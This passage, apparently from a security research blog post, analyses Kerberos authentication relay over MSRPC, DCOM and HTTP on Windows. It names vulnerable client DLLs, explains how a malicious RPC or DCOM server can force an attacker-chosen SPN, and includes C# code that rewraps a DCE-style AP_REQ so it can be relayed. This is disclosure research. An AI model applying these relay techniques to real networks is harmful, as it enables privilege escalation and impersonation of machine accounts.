href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtinqserverprincname\"&gt;RpcMgmtInqServerPrincName &lt;/a&gt;&lt;/span&gt;&lt;span&gt;management API. Once the SPN is queried the client can configure its authentication for the connection using the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfo\"&gt;RpcBindingSetAuthInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. However, this isn&amp;#39;t required; the client could just generate the SPN manually and set it. If the client doesn&amp;#39;t call &lt;/span&gt;&lt;span class=\"c4\"&gt;RpcBindingSetAuthInfo&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;then it will not perform any authentication on the RPC connection.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;Aside, curiously when a connection is made to the server it can query the client&amp;#39;s authentication information using the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindinginqauthclient\"&gt;RpcBindingInqAuthClient&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;API. However, the SPN that this API returns is the one registered by RpcServerRegisterAuthInfo and NOT the one which was used by the client to authenticate. Also Microsoft does mention the call to RpcMgmtInqServerPrincName in the &amp;quot;&lt;/span&gt;&lt;span class=\"c8 c4\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/choosing-security-qos-options\"&gt;Writing a secure RPC client or server&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c25 c14 c4\"&gt;&amp;quot; section on MSDN. However they frame it in the context of mutual authentication and not to protect against a relay attack.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;If a client queries for the SPN from a malicious RPC server it will authenticate using a Kerberos AP_REQ for an SPN fully under the attacker&amp;#39;s control. Whether the AP_REQ has integrity or confidentiality enabled depends on the authentication level set during the call to &lt;/span&gt;&lt;span class=\"c4\"&gt;RpcBindingSetAuthInfo&lt;/span&gt;&lt;span&gt;. If this is set to &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the client uses &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span&gt;&amp;nbsp;then the AP_REQ won&amp;#39;t have integrity enabled. However, if &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;is used or anything above &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_CONNECT&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;as a level is used then it will have the integrity/confidentiality flags set.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Doing a quick scan in &lt;/span&gt;&lt;span class=\"c4\"&gt;system32 &lt;/span&gt;&lt;span&gt;the following DLLs call the &lt;/span&gt;&lt;span class=\"c4\"&gt;RpcMgmtInqServerPrincName&lt;/span&gt;&lt;span&gt;&amp;nbsp;API: &lt;/span&gt;&lt;span class=\"c4\"&gt;certcli.dll, dot3api.dll, dusmsvc.dll, FrameServerClient.dll, L2SecHC.dll, luiapi.dll, msdtcprx.dll, nlaapi.dll, ntfrsapi.dll, w32time.dll, WcnApi.dll, WcnEapAuthProxy.dll, WcnEapPeerProxy.dll, witnesswmiv2provider.dll, wlanapi.dll, wlanext.exe, WLanHC.dll, wlanmsm.dll, wlansvc.dll, wwansvc.dll, wwapi.dll. &lt;/span&gt;&lt;span&gt;Some basic analysis shows that none of these clients check the value of the SPN and use it verbatim with &lt;/span&gt;&lt;span class=\"c4\"&gt;RpcBindingSetAuthInfo&lt;/span&gt;&lt;span&gt;. That said, they all seem to use &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_NEGOTIATE&lt;/span&gt;&lt;span&gt;&amp;nbsp;and set the authentication level to &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_PRIVACY&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;which makes them less useful as an attack vector.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;If the client specifies &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_NEGOTIATE&lt;/span&gt;&lt;span&gt;&amp;nbsp;but does not specify an SPN then the runtime generates one automatically. This is based on the target hostname with the &lt;/span&gt;&lt;span class=\"c4\"&gt;RestrictedKrbHost &lt;/span&gt;&lt;span&gt;service class. The runtime doesn&amp;#39;t process the hostname, it just concatenates strings and for some reason the runtime doesn&amp;#39;t support generating the SPN for &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;One additional quirk of the RPC runtime is that the request attribute flag &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_USE_DCE_STYLE&lt;/span&gt;&lt;span&gt;&amp;nbsp;is used when calling &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;. This enables a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/190ab8de-dc42-49cf-bf1b-ea5705b7a087\"&gt;special three-leg authentication mode&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;which results in the server sending back an AP_RET and then receiving another AP_RET from the client. Until that third AP_RET has been provided to the server it won&amp;#39;t consider the authentication complete so it&amp;#39;s not sufficient to just forward the initial AP_REQ token and close the connection to the client. This just makes the relay code slightly more complex but not impossible.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;A second change that &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_USE_DCE_STYLE&lt;/span&gt;&lt;span&gt;&amp;nbsp;introduces is that the Kerberos AP_REQ token does not have an GSS-API wrapper. This causes the call to &lt;/span&gt;&lt;span class=\"c4\"&gt;NegpDetermineTokenPackage&lt;/span&gt;&lt;span&gt;&amp;nbsp;to fail to detect the package in use, making it impossible to directly forward the traffic to a server using the &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;package. However, this prefix is not protected against modification so the relay code can append the appropriate value before forwarding to the server. For example the following C# code can be used to convert a DCE style AP_REQ to a GSS-API format which &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span class=\"c3\"&gt;will accept.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3c51830e72fcb7113b1dc4666718252f7b0b751f\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2 c13\"&gt;public&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;static&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c2\"&gt;[] EncodeLength(&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;int&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;length)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c6 c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c2 c6\"&gt;&amp;nbsp;(length &amp;lt; 0x80)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;return&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c2\"&gt;[] { (&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;)length };&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;(length &amp;lt; 0x100)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;return&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c2\"&gt;[] { 0x81, (&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;)length };&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;(length &amp;lt; 0x10000)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;return&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c2\"&gt;[] { 0x82, (&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;)(length &amp;gt;&amp;gt; 8), &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;)(length &amp;amp; 0xFF) };&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;throw&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;ArgumentException(&lt;/span&gt;&lt;span class=\"c2 c36\"&gt;&amp;quot;Invalid length&amp;quot;&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;, nameof(length));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c6 c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7 c9\"&gt;&lt;span class=\"c6 c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2 c13\"&gt;public&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;static&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c2\"&gt;[] ConvertApReq(&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;[] token)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c6 c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;(token.Length == 0 || token[0] != 0x6E)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;return&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;token;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; MemoryStream stm = &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;MemoryStream();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; BinaryWriter writer = &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;BinaryWriter(stm);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; Console.WriteLine(&lt;/span&gt;&lt;span class=\"c2 c36\"&gt;&amp;quot;Converting DCE AP_REQ to GSS-API format.&amp;quot;&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c2\"&gt;[] header = &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;[] { 0x06, 0x09, 0x2a, 0x86, 0x48, &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x86, 0xf7, 0x12, 0x01, 0x02, 0x02, 0x01, 0x00 };&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; writer.Write((&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;byte&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;)0x60);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp; &amp;nbsp; writer.Write(EncodeLength(header.Length + token.Length));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp; &amp;nbsp; writer.Write(header);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp; &amp;nbsp; writer.Write(token);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c2 c13\"&gt;return&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;&amp;nbsp;stm.ToArray();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c7\"&gt;&lt;span class=\"c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Subsequent tokens in the authentication process don&amp;#39;t need to be wrapped; in fact, wrapping them with their GSS-API headers will cause the authentication to fail. Relaying MSRPC requests would probably be difficult just due to the relative lack of clients which request the server&amp;#39;s SPN. Also when the SPN is requested it tends to be a conscious act of securing the client and so best practice tends to require the developer to set the maximum authentication level, making the Kerberos AP_REQ less useful.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.pn61xux6i1ia\"&gt;&lt;span class=\"c6 c19\"&gt;DCOM&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The DCOM protocol uses MSRPC under the hood to access remote COM objects, therefore it should have the same behavior as MSRPC. The big difference is DCOM is designed to automatically handle the authentication requirements of a remote COM object through binding information contained in the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/7fe8200b-dccd-48cf-a2fa-681e3e0a23f4\"&gt;DUALSTRINGARRAY&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;returned during &lt;/span&gt;&lt;span class=\"c4\"&gt;Object Exporter ID (OXID)&lt;/span&gt;&lt;span&gt;&amp;nbsp;resolving. Therefore the client doesn&amp;#39;t need to explicitly call &lt;/span&gt;&lt;span class=\"c4\"&gt;RpcBindingSetAuthInfo &lt;/span&gt;&lt;span class=\"c3\"&gt;to configure the authentication.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The binding information contains the protocol sequence and endpoint to use (such as TCP on port 30000) as well as the security bindings. Each security binding contains the RPC authentication service (&lt;/span&gt;&lt;span class=\"c4\"&gt;wAuthnSvc&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the below screenshot) to use as well as an optional SPN (&lt;/span&gt;&lt;span class=\"c4\"&gt;aPrincName&lt;/span&gt;&lt;span&gt;) for the authentication. Therefore a malicious DCOM server can force the client to use the &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;authentication service with a completely arbitrary SPN by returning an appropriate security binding.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c14 c4 c25\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEiN78ReCzU5wVJ3qCozRJ2MSkKX4-Bm_S0zDSU2TNs6BrYoBffMIr7WZuL4AiNiO8rbVWrTkdGwjp6S2yyQptBIh82kWiKNOU-ziSntZpjGETP1TfIvXYzKFQyyW9C_qMEyoM3c1-7tdoqNLWxh2RYuq1pgbBFAtUCTjyQZzrU1h7mOxFnAl2l1PQBEuw=s1372\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEiN78ReCzU5wVJ3qCozRJ2MSkKX4-Bm_S0zDSU2TNs6BrYoBffMIr7WZuL4AiNiO8rbVWrTkdGwjp6S2yyQptBIh82kWiKNOU-ziSntZpjGETP1TfIvXYzKFQyyW9C_qMEyoM3c1-7tdoqNLWxh2RYuq1pgbBFAtUCTjyQZzrU1h7mOxFnAl2l1PQBEuw=s1372\" border=\"0\" alt=\"Screenshot of part of the MS-DCOM protocol documentation showing the SECURITYBINDING structure\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c25 c14 c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The authentication level chosen by the client depends on the value of the &lt;/span&gt;&lt;span class=\"c4\"&gt;dwAuthnLevel&lt;/span&gt;&lt;span&gt;&amp;nbsp;parameter specified if the COM client calls the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity\"&gt;CoInitializeSecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If the client doesn&amp;#39;t explicitly call &lt;/span&gt;&lt;span class=\"c4\"&gt;CoInitializeSecurity&lt;/span&gt;&lt;span&gt;&amp;nbsp;then a default will be used which &lt;/span&gt;&lt;span&gt;is currently &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_CONNECT.&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;This means neither integrity or confidentiality will be enforced on the Kerberos AP_REQ by default.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;One limitation is that without a call to &lt;/span&gt;&lt;span class=\"c4\"&gt;CoInitializeSecurity, &lt;/span&gt;&lt;span&gt;the default impersonation level for the client is set to &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_IMP_LEVEL_IDENTIFY&lt;/span&gt;&lt;span&gt;. This means the access token generated by the DCOM RPC authentication can only be used for identification and not for impersonation. For some services this isn&amp;#39;t an issue, for example LDAP doesn&amp;#39;t need an impersonation level token. However for others such as SMB this would prevent access to files. It&amp;#39;s possible that you could find a COM client which sets both &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_CONNECT &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_IMP_LEVEL_IMPERSONATE&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;though there&amp;#39;s no trivial process to assess that.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Getting a client to connect to the server isn&amp;#39;t trivial as DCOM isn&amp;#39;t a widely used protocol on modern Windows networks due to high authentication requirements. However, one use case for this is local privilege escalation. For example you could get a privileged service to connect to the malicious COM server and relay the computer account Kerberos AP_REQ which is generated. I have a working PoC for this which allows a local non-admin user to connect to the domain&amp;#39;s LDAP server using the local computer&amp;#39;s credentials. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;This attack is somewhat similar to the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/antonioCoco/RemotePotato0\"&gt;RemotePotato&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;attack (which uses NTLM rather than Kerberos) which again Microsoft have refused to fix. I&amp;#39;ll describe this in more detail in a separate &lt;/span&gt;&lt;span&gt;blog post after this one&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.hn66nwtnflze\"&gt;&lt;span class=\"c6 c19\"&gt;HTTP&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;HTTP has supported &lt;/span&gt;&lt;span class=\"c4\"&gt;NTLM&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;authentication for a long time (see &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://datatracker.ietf.org/doc/html/draft-brezak-spnego-http-04\"&gt;this draft&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from 2002 although the most recent RFC is &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://datatracker.ietf.org/doc/html/rfc4559\"&gt;4559&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from 2006). To initiate a Windows authentication session the server can respond to a request with the status code 401 and specify a &lt;/span&gt;&lt;span class=\"c4\"&gt;WWW-Authenticate&lt;/span&gt;&lt;span&gt;&amp;nbsp;header with the value &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;. If the client supports Windows authentication it can use &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;to generate a token, convert the binary token into a Base64 string and send it in the next request to the server with the &lt;/span&gt;&lt;span class=\"c4\"&gt;Authorization&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;header. This process is repeated until the client errors or the authentication succeeds.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;In theory only &lt;/span&gt;&lt;span class=\"c4\"&gt;NTLM&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;are defined but a HTTP implementation could use other Windows authentication packages such as &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos &lt;/span&gt;&lt;span class=\"c3\"&gt;if it so chose to. Whether the HTTP client will automatically use the user&amp;#39;s credentials is up to the user agent or the developer using it as a library.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;All the major browsers support both authentication types as well as many non browser HTTP user agents such as those in .NET and WinHTTP. I looked at the following implementations, all running on Windows 10 21H1:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c24 lst-kix_fmj6vk2ylkib-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;WinINET (Internet Explorer 11)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;WinHTTP (WebClient)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;Chromium M93 (Chrome and Edge)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;Firefox 91&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;.NET Framework 4.8&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;.NET 5.0 and 6.0&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;This is of course not an 